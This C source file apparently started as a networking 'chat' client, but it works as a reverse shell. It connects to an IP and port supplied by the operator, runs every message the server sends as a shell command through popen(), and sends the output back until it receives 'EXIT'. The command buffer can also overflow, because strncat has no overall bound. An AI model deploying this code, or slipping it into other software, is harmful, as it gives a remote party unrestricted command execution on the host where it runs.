#include "netfunctions.h"
#include "chat.h"

int startConnection(char *ipAddress, char *port)
{
    int sockfd;
    struct sockaddr_in servaddr;

    sockfd = Socket(AF_INET, SOCK_STREAM, 0);

    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(atoi(port));

    Inet_pton(AF_INET, ipAddress, &servaddr.sin_addr);

    printf("Establishing communication...\n");
    Connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));

    struct sockaddr_in myaddr;
    socklen_t len = sizeof(myaddr);
    Getsockname(sockfd, (struct sockaddr *)&myaddr, &len);
    char myaddrIP[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &(myaddr.sin_addr.s_addr), myaddrIP, INET_ADDRSTRLEN);
    printf("...Connection succesfull\n");
    printf("Socket Local IP :: %s and PORT:: %u\n", myaddrIP, ntohs(myaddr.sin_port));

    Getpeername(sockfd, (struct sockaddr *)&myaddr, &len);
    inet_ntop(AF_INET, &(myaddr.sin_addr.s_addr), myaddrIP, INET_ADDRSTRLEN);
    printf("Socket Server IP :: %s and PORT:: %u\n", myaddrIP, ntohs(myaddr.sin_port));

    return sockfd;
}

char *readMsg(int connfd)
{
    char *recvline = (char *)calloc((MAXCLIREAD + 1), sizeof(char));
    int n;
    n = read(connfd, recvline, MAXCLIREAD);
    if (n < 0)
    {
        perror("read error");
        exit(1);
    }
    return recvline;
}

int sendMsg(int connfd, char *msg)
{
    if (strncmp(msg, "EXIT", strlen("EXIT")) == 0)
    {
        write(connfd, "EXIT\n", strlen("EXIT\n"));
    }
    else
    {
        char response[MAXRESPONSE];
        char output[MAXRESPONSE];
        memset(response, 0, sizeof(response));
        memset(output, 0, sizeof(output));
        FILE *fp;
        fp = popen(msg, "r");
        if (fp == NULL)
        {
            write(connfd, "Failed to run command\n", strlen("Failed to run command\n"));
            perror("Failed to run command");
        }
        else
        {
            while (fgets(output, sizeof(output), fp) != NULL)
            {
                strncat(response, output, strlen(output));
            }
            if (strlen(response) > 0)
            {
                write(connfd, response, strlen(response));
            }
            else
            {
                write(connfd, "Failed to run command\n", strlen("Failed to run command\n"));
            }
        }
        pclose(fp);
    }
    return 0;
}

int main(int argc, char **argv)
{
    int sockfd;
    char *recvline = NULL;
    char error[MAXLINE + 1];

    if (argc != 3)
    {
        strcpy(error, "uso: ");
        strcat(error, argv[0]);
        strcat(error, " <IPaddress> <Port>");
        perror(error);
        exit(1);
    }

    sockfd = startConnection(argv[1], argv[2]);

    do
    {
        if (recvline != NULL)
            free(recvline);
        recvline = readMsg(sockfd);
        sendMsg(sockfd, recvline);
    } while (strncmp(recvline, "EXIT", strlen("EXIT")) != 0);

    do
    {
        if (recvline != NULL)
            free(recvline);
        recvline = readMsg(sockfd);
    } while (strncmp(recvline, "bye\n", strlen("bye\n")));

    return 0;
}
